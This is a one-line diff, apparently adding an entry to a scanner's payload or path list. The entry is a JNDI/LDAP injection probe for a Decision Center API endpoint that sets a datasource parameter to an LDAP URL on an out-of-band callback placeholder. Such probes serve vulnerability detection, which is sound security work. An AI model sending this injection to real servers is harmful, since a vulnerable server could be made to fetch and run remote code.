@@ -1,0 +1,1 @@
+/decisioncenter-api/v1/about?datasource=ldap://{{interactsh-url}}
